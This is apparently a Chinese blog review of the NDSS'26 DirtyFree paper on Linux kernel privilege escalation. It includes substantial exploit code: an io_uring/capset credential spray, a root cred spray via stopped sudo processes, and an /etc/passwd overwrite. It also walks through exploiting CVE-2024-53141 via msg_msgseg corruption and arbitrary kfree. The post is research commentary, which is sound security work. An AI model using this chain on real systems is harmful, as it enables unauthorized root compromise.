---
title: "[NDSS'26] DirtyFree: Simplified Data-Oriented Programming in the Linux Kernel"
pubDate: 2026-03-12
description: "DirtyFree 提出了一种新的 Data-Oriented Programming 攻击手段，仅用 partial-overwrite 原语即可实现权限提升，并可绕过 SLAB_VIRTUAL 缓解措施。"
authors: [nova]
lang: zh
---

> https://www.ndss-symposium.org/ndss-paper/dirtyfree-simplified-data-oriented-programming-in-the-linux-kernel/

提出了一种新的攻击手段，可以将 partial-overwrite 的攻击仅用一个原语就转换为权限提升，并且可以绕过 `SLAB_VIRTUAL` (未合入主线，在 [kCTF mitigation bypass](https://google.github.io/security-research/kernelctf/rules.html#2-mitigation-bypass-on-the-mitigation-instance) 里使用，[RFC](https://lore.kernel.org/lkml/20230915105933.495735-9-matteorizzo@google.com/#r) 两三年没更新应该是合不了主线了）这种防止 Temporal CrossCache Attack 的缓解措施。



## Proof of Concept

### Threat Model

与大多数 upstream linux distribution 使用的内核类似，开启了 KASLR、SMEP、SMAP、KPTI，除此之外额外开启了 KCFI 和 SLAB_VIRTUAL



拥有一个漏洞驱动，可以分配至多 5 个 note，note 可读可写可分配可释放，在释放后不清理指针，导致存在 UAF 漏洞。

```c
#define MAX_SIZE 0x1000
#define MAX_NOTES 5

struct vuln_request {
    unsigned long long size; // Less than 0x1000
    unsigned long long addr;
    unsigned long long idx;  // Note index (0-4)
    char __user *data;
};

struct note {
    size_t size;
    char *data;
};

static long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    struct vuln_request __user *req = (struct vuln_request __user *)arg;

    switch (cmd) {
    case VULN_ALLOC:
        return handle_alloc(req);
    case VULN_FREE:
        return handle_free(req);
    case VULN_READ:
        return handle_read(req);
    case VULN_WRITE:
        return handle_write(req);
    default:
        return -ENOTTY;
    }
}
```

### Overview

![Overview of DirtyFree](https://cdn.nova.gal/img/image-20260312134727448.png)

在 PoC 里，攻击思路有所简化，但整体仍遵从上图。

1. 堆喷 User Cred
2. 部分覆写指针使其指向其中一个 User Cred
3. 使用 Arbitrary Free Permitive 释放 User Cred，制造 Cred UAF
4. 堆喷 Root Cred，使之前的 User Cred 被覆盖为 Root Cred
5. 提权



不难思考，因为 Cred 等危险结构体都被专门分配到了诸如 `cred_jar` 等 `dedicated cache`，无法轻易造成 UAF，因此其他一些 DOP 手段选择利用 CrossCache 这样更加 low-level 的方法绕过。而 DirtyFree 则通过 ArbitraryFree 原语直接进行释放并重用，既简化了流程，又使得整个攻击可靠性相对较高（得益于其所在的 `dedicated cache`）。据作者论文指出，在待机状态下能达到接近 96% 的利用可靠性，虽然我不行。

> We observe that DIRTYFREE achieves a success rate of 95.6% in the idle state and 87.4% in the busy state.

接下来，我们针对每一个环节进行讲解。

### 1. User cred spray

为了尽可能精确的预测 User Cred 的位置，我们理应喷射尽可能多的 cred 结构体。然而，更多的喷射意味着更多的噪声，也就意味着更加不可控的内存布局。例如 `fork()` 系统调用虽然能够产生 cred 结构体，但它既无法做到“大量”（受到进程数量限制），也无法做到“可控”（调用过程中分配多种不同的结构体，例如 `task_struct`，干扰堆布局）。作者使用了 IO_URING 系列的系统调用，具体而言，利用 `IORING_REGISTER_PERSONALITY `调用 `capset()` syscall 时，内核会通过复制当前的凭证来分配新的 cred 对象，而不会产生额外的无关对象，在此之后，使用相同的标志调用 `io_uring_register()`，即可增加它们的引用计数，防止它们被释放。这种方法可靠地提供了一个完全由 cred 结构体组成的，且极度密集的堆喷。

```c
int app_setup_uring(struct submitter *s, unsigned int entries)
{
    struct app_io_sq_ring *sring = &s->sq_ring;
    struct app_io_cq_ring *cring = &s->cq_ring;
    struct io_uring_params p;
    void *sq_ptr, *cq_ptr;

    memset(&p, 0, sizeof(p));
    p.wq_fd = -1;

    s->ring_fd = io_uring_setup(entries, &p);
    if (s->ring_fd < 0) {
        perror("io_uring_setup");
        return 1;
    }

    /* Calculate ring buffer sizes */
    int sring_sz = p.sq_off.array + p.sq_entries * sizeof(unsigned);
    int cring_sz = p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe);

    /* Check if single mmap is supported (kernel 5.4+) */
    if (p.features & IORING_FEAT_SINGLE_MMAP) {
        if (cring_sz > sring_sz) {
            sring_sz = cring_sz;
        }
        cring_sz = sring_sz;
    }

    /* Map submission queue ring buffer */
    sq_ptr = mmap(0, sring_sz, PROT_READ | PROT_WRITE,
                  MAP_SHARED | MAP_POPULATE, s->ring_fd, IORING_OFF_SQ_RING);
    if (sq_ptr == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    /* Map completion queue ring buffer */
    if (p.features & IORING_FEAT_SINGLE_MMAP) {
        cq_ptr = sq_ptr;
    } else {
        cq_ptr = mmap(0, cring_sz, PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_POPULATE, s->ring_fd, IORING_OFF_CQ_RING);
        if (cq_ptr == MAP_FAILED) {
            perror("mmap");
            return 1;
        }
    }

    /* Initialize submission queue ring structure */
    sring->head = sq_ptr + p.sq_off.head;
    sring->tail = sq_ptr + p.sq_off.tail;
    sring->ring_mask = sq_ptr + p.sq_off.ring_mask;
    sring->ring_entries = sq_ptr + p.sq_off.ring_entries;
    sring->flags = sq_ptr + p.sq_off.flags;
    sring->array = sq_ptr + p.sq_off.array;

    /* Initialize completion queue ring structure */
    cring->head = cq_ptr + p.cq_off.head;
    cring->tail = cq_ptr + p.cq_off.tail;
    cring->ring_mask = cq_ptr + p.cq_off.ring_mask;
    cring->ring_entries = cq_ptr + p.cq_off.ring_entries;
    cring->cqes = cq_ptr + p.cq_off.cqes;

    /* Map submission queue entries array */
    s->sqes = mmap(0, p.sq_entries * sizeof(struct io_uring_sqe),
                   PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
                   s->ring_fd, IORING_OFF_SQES);
    if (s->sqes == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    return 0;
}

void alloc_n_creds(int uring_fd, size_t n_creds)
{
    for (size_t i = 0; i < n_creds; i++) {
        struct __user_cap_header_struct cap_hdr = {
            .pid = 0,
            .version = _LINUX_CAPABILITY_VERSION_3
        };

        struct user_cap_data_struct cap_data[2] = {
            {.effective = 0, .inheritable = 0, .permitted = 0},
            {.effective = 0, .inheritable = 0, .permitted = 0}
        };

        /* Allocate new credential */
        if (syscall(SYS_capset, &cap_hdr, (void *)cap_data))
            fatal("capset() failed");

        /* Register with io_uring to increment refcount */
        if (syscall(SYS_io_uring_register, uring_fd,
                    IORING_REGISTER_PERSONALITY, 0, 0) < 0)
            fatal("io_uring_register() failed");
    }
}

void spray_user_creds(struct submitter *uring_cred)
{
    printf("[*] Setting up io_uring for credential spray...\n");
    app_setup_uring(uring_cred, 0x80);

    printf("[*] Spraying user credentials into kernel heap...\n");
    alloc_n_creds(uring_cred->ring_fd, 0xffff);

    printf("[+] User credential spray complete\n");
}
```

以这个例子而言，它分配了 0xffff 个 0xc0 大小的 cred 结构体，占据了 12MB 的空间，使得我们能够拥有一个极其可预测的堆布局。



### 2. Partial pointer overwrite

这里就没有特别多细节了。

能够 Partial Overwrite 那就不用泄露，找一个命中期望率比较高的地方，改低几位就可以。

不能那就得泄露 heap address 然后改。



### 3. Arbitrary Free

在 PoC 中，这个能力由漏洞驱动本身提供。在 DirtyFree 中，作者整理了能够做到这点的结构体，覆盖了除 `kmalloc-8` 之外的所有 general cache，也就意味着在这些 cache 里的漏洞驱动，都可以利用他们来做 arbitrary free



### 4.Root cred spray

这里思路也没有什么新鲜的，利用 SUID 的程序然后 fork 。

作者把进程 stop 了，以保证凭证不会被释放。

```c
void spray_root_creds(void)
{
    printf("[*] Spraying root credentials via sudo processes...\n");

    for (int i = 0; i < 2048; i++) {
        int pid = fork();
        if (!pid) {
            /* Child process: exec sudo */
            execve("/usr/bin/sudo", (char *[]){"/usr/bin/sudo", NULL}, NULL);
            perror("execve sudo");
            exit(-1);
        } else if (pid > 0) {
            /* Parent process: stop child to keep credentials allocated */
            usleep(1500);
            kill(pid, SIGSTOP);
        } else {
            perror("fork");
            exit(-1);
        }
    }

    printf("[+] Root credential spray complete\n");
}
```



### 5. Privilege Escalation

由于我们堆喷了 65536 个 cred，无法得知究竟是哪个 cred 结构体被覆盖，因此直接起 Shell 肯定是不太实际的。

一般思路就是利用 `open()` 打开并写入一个特权文件，例如，`/etc/passwd`。

当然，这里我们仍然需要使用 IO_URING 系列的操作。

```c
int submit_to_sq(struct submitter *s, struct io_uring_sqe *sqes,
                 unsigned int sqe_len, unsigned int min_complete)
{
    struct app_io_sq_ring *sring = &s->sq_ring;
    unsigned index, head, tail, next_tail, mask, to_submit;

    next_tail = tail = *sring->tail;

    /* Add entries to submission queue */
    for (to_submit = 0; to_submit < sqe_len; to_submit++) {
        read_barrier();
        head = *sring->head;
        mask = *s->sq_ring.ring_mask;

        /* Check if queue is full */
        if ((head & mask) == (tail & mask) && head != tail) {
            break;
        }

        next_tail++;
        index = tail & mask;
        struct io_uring_sqe *sqe = &s->sqes[index];
        memcpy(sqe, &sqes[to_submit], sizeof(*sqe));
        sring->array[index] = index;
        tail = next_tail;
    }

    /* Update tail pointer */
    if (*sring->tail != tail) {
        *sring->tail = tail;
        write_barrier();
    }

    /* Submit to kernel */
    int ret = io_uring_enter(s->ring_fd, to_submit, min_complete,
                             IORING_ENTER_GETEVENTS);
    if (ret < 0) {
        perror("io_uring_enter");
        return ret;
    }

    return to_submit;
}


int read_from_cq(struct submitter *s, bool print, int *reaped_success,
                 int *results)
{
    struct app_io_cq_ring *cring = &s->cq_ring;
    struct io_uring_cqe *cqe;
    unsigned head, reaped = 0, success = 0;

    head = *cring->head;

    do {
        read_barrier();

        /* Check if queue is empty */
        if (head == *cring->tail)
            break;

        /* Get completion entry */
        cqe = &cring->cqes[head & *s->cq_ring.ring_mask];

        if (print) {
            if (cqe->res < 0) {
                printf("    [CQE] res=%d (error: %s), user_data=0x%llx\n",
                       cqe->res, strerror(abs(cqe->res)), cqe->user_data);
            } else {
                printf("    [CQE] res=%d, user_data=0x%llx\n",
                       cqe->res, cqe->user_data);
            }
        }

        if (cqe->res >= 0) {
            success++;
            if (results) {
                *results++ = cqe->res;
            }
        }

        head++;
        reaped++;
    } while (1);

    *cring->head = head;
    write_barrier();

    if (reaped_success != NULL) {
        *reaped_success = success;
    }

    return reaped;
}

void overwrite_passwd(struct submitter *uring_cred, int root_fd, const char *fake_passwd)
{
    struct io_uring_sqe sqe;
    memset(&sqe, 0, sizeof(sqe));

    /* Prepare OPENAT operation for /etc/passwd */
    sqe.opcode = IORING_OP_OPENAT;
    sqe.fd = root_fd;
    sqe.addr = (__u64)"etc/passwd";
    sqe.open_flags = O_RDWR;
    sqe.len = 0;
    sqe.file_index = 0;

    printf("[*] Scanning through credentials to find root cred...\n");

    int reaped_success = 0, reap_cnt = 0, flag_fd;

    /* Try each personality until we find one that can open /etc/passwd */
    for (int i = 0; i < 0xffff && !reaped_success; i++) {
        reap_cnt++;
        sqe.personality = i + 1;
        submit_to_sq(uring_cred, &sqe, 1, 1);
        read_from_cq(uring_cred, false, &reaped_success, &flag_fd);
    }

    if (!reaped_success) {
        fatal("[!] Failed to open /etc/passwd (root cred not found)");
    }

    printf("[+] Successfully opened /etc/passwd with cred 0x%x, fd: %d\n", reap_cnt, flag_fd);

    /* Write fake passwd entry */
    write(flag_fd, fake_passwd, strlen(fake_passwd));

    printf("[+] /etc/passwd overwritten with root entry!\n");
}
```

### 调试相关

简单记录一下以供参考

```bash
gdb-gef --ex "target remote :1234" --ex "ksymaddr-remote-apply" --ex "kmod-load ToyExample ToyExample.ko" --ex "b prepare_creds" --ex "b ToyExample.c:224" --ex "b ToyExample.c:152"
```

```bash
gef> p/x *(struct cred *)$1
gef> slub-dump kmalloc-192 -vv
gef> b __x64_sys_io_uring_enter
gef> slab-contains 0xffff9ce542b6d180
```



## Arbitrary Free Object

想要满足 AFO，主要就是两个关键：
1. 有一个 ptr 指向 heap area，并且有方法可以 `kfree()` 掉它（不是 `kmem_cache_free()`，因为它需要看 metadata，如果不对就会 g）
2. 能够被低特权用户分配、释放。
除此之外，如果在分配与释放之间有足够长的空间窗口也能比较显著的增加可利用性。

作者在找 AFO 的时候主要是通过追踪所有 `kfree()` 及其变种，追踪其是否能被用户态触发。

对于候选，判断这个 ptr 是否是一个 local variable 并且 context 里有 kmalloc —— 这种 temporary var 会被去掉，因为 window 不够长。完成之后，他们继续做反向数据流追踪，最终选出那些 object 不在 stack 和 global memory region 里的 object。

> 说白了就是找那种有 Obj->ptr，并且 Obj obj 被分配在 heap area，并且分配和释放是可控的调用

然后继续 filter，把那些 dedicated caches 的 Obj 过滤掉，以及那些 temporary 的 Obj 过滤掉，最后把特权调用过滤掉，留下来的就是可以用的。

> 其实 temporary 的 Obj 也不是不能用，如果 allocation 和 deallocation 过程中有 `copy_to_user()`，那其实可以利用 FUSE 之类的去延长时间窗口，这类作者没有过滤掉。

最终其实包含了基本上所有 size cache 的 object ~~依旧 msg_msg 概念神~~
![image](https://cdn.nova.gal/img/vscode_picgo_1780485557983.png)

## Case Study

两个多月没动了，但是当时看的时候还是有很多疑惑🤔，但是现在想不起来了。现在重新思考的话：
1. 大概就是公开几个都是多种方式能打的，唯一一个其他方式不能打而它能打的没公开；
2. 都是需要 read + write 原语做泄露和改 ptr 的，但论文里 claim 只需要一个 Arbitrary Free 原语（反正怎么说，原语定义就这样，我要硬说你 leak 也算是原语的一部分你也没辙）。
3. 所谓不需要 AAW 和 AAR，但是其实用了一个 fixed offset 去算 cred 的位置，至少在我的机子上是跑不通的，reliability 难说哈。

### Analyze
总而言之我们来看 CVE-2024-53141，这是一个 out-of-bounds 漏洞，在 `net/netfilter/ipset/ip_set_bitmap_ip.c` 里面存在一个利用 `bitmap:ip` 把位图表示一个 ip 段的操作。

> 之前调的，现在忘了，直接看 AI 吧。

```c
/* Type structure */
struct bitmap_ip {
	unsigned long *members;	/* the set members */
	u32 first_ip;		/* host byte order, included in range */
	u32 last_ip;		/* host byte order, included in range */
	u32 elements;		/* number of max elements in the set */
	u32 hosts;		/* number of hosts in a subnet */
	size_t memsize;		/* members size */
	u8 netmask;		/* subnet netmask */
	struct timer_list gc;	/* garbage collection */
	struct ip_set *set;	/* attached to this ip_set */
	unsigned char extensions[]	/* data extensions */
		__aligned(__alignof__(u64));
};

/* ADT structure for generic function args */
struct bitmap_ip_adt_elem {
	u16 id;
};
```

在函数 `bitmap_ip_uadt` 里，做了 CIDR 之后，ip 被改写，但随后没有再次检查 `ip >= map->first_ip`，导致 `ip_to_id` 直接处理之前的 `map->first_ip` 之前的地址。

```c
// ① 第一次边界检查：用原始 ip 做检查
if (ip < map->first_ip || ip > map->last_ip)
    return -IPSET_ERR_BITMAP_RANGE;
// 传入 ip = 0xFFFFFFFF, first_ip = 0xFFFFFFCB → 检查通过 ✓

// ② CIDR 掩码：ip 被改写为网络地址（完全不同的值！）
} else if (tb[IPSET_ATTR_CIDR]) {
    u8 cidr = nla_get_u8(tb[IPSET_ATTR_CIDR]);
    ip_set_mask_from_to(ip, ip_to, cidr);
    // CIDR=3: ip = 0xFFFFFFFF & 0xE0000000 = 0xE0000000
    //         ip_to = 0xFFFFFFFF
}

// ③ 只检查 ip_to 的上界，完全没有重新检查 ip 的下界
if (ip_to > map->last_ip)
    return -IPSET_ERR_BITMAP_RANGE;
// 0xFFFFFFFF > 0xFFFFFFFF → FALSE → 通过 ✓

// ④ 循环从 ip=0xE0000000 开始，没有 ip >= first_ip 的限制！
for (; !before(ip_to, ip); ip += map->hosts) {
    e.id = ip_to_id(map, ip);   // ← OOB 在这里发生
    ret = adtfn(set, &e, &ext, &ext, flags);
    ...
}
```

在 `ip_to_id` 里面
```
static u32 ip_to_id(const struct bitmap_ip *m, u32 ip)
{
    return ((ip & ip_set_hostmask(m->netmask)) - m->first_ip) / m->hosts;
}
```

当 ip = 0xE0000000，first_ip = 0xFFFFFFCB，netmask = 32，hosts = 1：


id (u32) = 0xE0000000 - 0xFFFFFFCB = 0xE0000035   （无符号下溢回绕）

放回到 `bitmap_ip_adt_elem` 的时候，这个 id 就被截断：
id (u16) = 0x0035 = 53。

而这个 map 的分配是 `map = ip_set_alloc(sizeof(*map) + elements * set->dsize);`，也就是 `[0, elements-1]`，在这里正好是 `[0, 0x34]`，因此有一个 slot 可以越界。

### Exploit
利用分三个阶段，完整流程：


阶段 1：OOB 读 → 泄露堆地址
阶段 2：OOB 写 → 构造 arbitrary free
阶段 3：DirtyFree → cross-cache free + root cred 替换


#### Heap Leak

目标 cache：kmalloc-cg-512

构造 bitmap:ip map，大小精确落入 kmalloc-cg-512：

```c
size = sizeof(struct bitmap_ip) + 0x35 × dsize_comment
     = 0x58 + 0x35 × 0x8 = 0x200  →  kmalloc-cg-512 ✓
```

堆布局准备：


`[msg_msgseg] [msg_msgseg] ... [bitmap:ip map] [msg_msgseg] [msg_msgseg] ...`
                                    
OOB 写（带 COMMENT 扩展标志）：


```c
map->extensions[0x35] = get_ext(map, id=0x35)
                       ↕
相邻 msg_msgseg 起始位置
```

COMMENT 扩展在 ext 区域写入的是指向 comment 字符串缓冲区的内核堆指针。该指针被写入相邻 msg_msgseg 的数据区域，之后通过 msgrcv 读回消息内容时，扫描其中符合 0xffff... 模式的值即可得到内核堆地址：

```c
// 泄露扫描
for(int j = 0; j < MSG_SIZE; j += 8) {
    if((msg.mtext[j] & 0xffff000000000000) == 0xffff000000000000) {
        heap_leak_addr = msg.mtext[j];
        break;
    }
}

// 从泄露地址推算 cred 位置（依赖固定偏移）
cred_addr = (heap_leak_addr & 0xfffffffffff00000) | 0x68e40;
```

#### OOB
目标 cache：kmalloc-cg-2048

构造更大的 bitmap:ip map：

```c
size = sizeof(struct bitmap_ip) + 0x7a × dsize_counter
     = 0x58 + 0x7a × 0x10 = 0x7F8  →  kmalloc-cg-2048（slot 0x800）
```
同样在相邻位置 spray msg_msgseg（这次 msg_msgseg 也落在 kmalloc-cg-2048）。

OOB 写（带 COUNTER 扩展标志）：

COUNTER 扩展在 ext 区域存储的是 bytes/packets 计数，直接写 64 位值。攻击者将 cred_addr 作为计数值传入：

```c
// 触发 OOB 写
mnl_attr_put_u64(nlh, IPSET_ATTR_BYTES | NLA_F_NET_BYTEORDER,
                 bswap_64(cred_addr));    // ← 写入 cred 地址
mnl_attr_put_u64(nlh, IPSET_ATTR_PACKETS | NLA_F_NET_BYTEORDER,
                 bswap_64(cred_addr));
```

`e->id = 0x7A` 时越界写到下一个 slot 的起始位置：

```
bitmap:ip map (0x7F8 bytes)
+---+---+---+...+---+  ← map 分配结束（slot 0x800 还剩 0x8 字节）
                    ↓OOB（+0 bytes，下个 slot 起始）
```
相邻 msg_msgseg->next = cred_addr   ← 被覆写！
msg_msgseg 结构体：

```
struct msg_msgseg {
    struct msg_msgseg *next;  // offset 0 ← 这里被写成 cred_addr
    char data[];
};
```

#### DirtyFree
触发 arbitrary free：

```c
msgctl(msqid[i], IPC_RMID, NULL);
// → freeque()
// → free_msg()
// → kfree(msg_msgseg->next)   ← msg_msgseg->next == cred_addr
// → kfree(cred_addr)          ← 把 cred 对象释放了！
```

这是 cross-cache free：free_msg 在 kmalloc-cg-2048 上下文中调用 kfree(cred_addr)，而 cred 对象属于 kmalloc-192 cache。

```c
kmalloc-192 freelist:  ... → [cred_addr] → ...
                                  ↑
                           cred 对象被挂进了 freelist
```
内核此时触发 oops（free_msg 继续遍历链表时解引用了 cred->usage = 1 当指针），但子进程在此之前已经就绪：

```c
子进程（io_uring personality 持有 user cred 引用）
  ↓ msgctl 触发 kfree(cred_addr)
  ↓ fork 大量 sudo 进程 → root cred 分配，落入 freed slot
  ↓ io_uring personality 仍指向 cred_addr
  ↓ io_uring OPENAT with personality → 以 root cred 执行
  ↓ 写 /etc/passwd → 得到 root shell
```

### Overview
```c
create_ip_set (kmalloc-cg-512, elements=0x35, WITH_COMMENT)
│
├─ spray msg_msgseg (kmalloc-cg-512，相邻填充)
│
├─ trigger_oob_leak (ip=0xFFFFFFFF, CIDR=3)
│    ip_to_id(0xE0000000) = 0xE0000035 → u16 truncate → 0x0035
│    OOB write: extensions[0x35] = comment 指针 → 覆盖邻 msg_msgseg 数据
│    msgrcv 读出泄露地址 → 计算 cred_addr
│
create_ip_set (kmalloc-cg-2048, elements=0x7a, WITH_COUNTERS)
│
├─ spray msg_msgseg (kmalloc-cg-2048，相邻填充)
│
├─ trigger_oob_write (ip=0xFFFFFFFF, CIDR=3, bytes/packets=cred_addr)
│    ip_to_id(0xE0000000) = 0xE0000035 → ... → 0x7A (不同集合参数)
│    OOB write: extensions[0x7A] = cred_addr → 覆盖邻 msg_msgseg->next
│
├─ msgctl(IPC_RMID) → free_msg() → kfree(cred_addr)  [cross-cache free]
│
└─ root cred spray → 占据 freed cred slot → root shell
```

## Comments

其实 Arbitrary Free 并不算是一个非常 novel 的利用手法，但是这篇文章比较系统的进行了分析，并且给了一个相对易用的 workflow，也给平常打 kernel 提供了一种方案。然而个人觉得他的可靠性并不高，完全没有办法达到论文 claim 的 95+ on idle 的成功率，只能说勉强能用。关键的 innovation 应该还是说可以做 cross-cache free，这个比 DirtyCred 好一些。

另外大概也就是写论文方面，攻击类的论文感觉就是这样写了，从 kCTF 里面抄个利用手法，然后取个名字，打几个 realcase，然后做个对比，系统分析一下原语，最后搞个防御，公公又式式。

> btw io_uring 那套 cred spray 感觉也是 DirtyCred 的东西，爽缝合。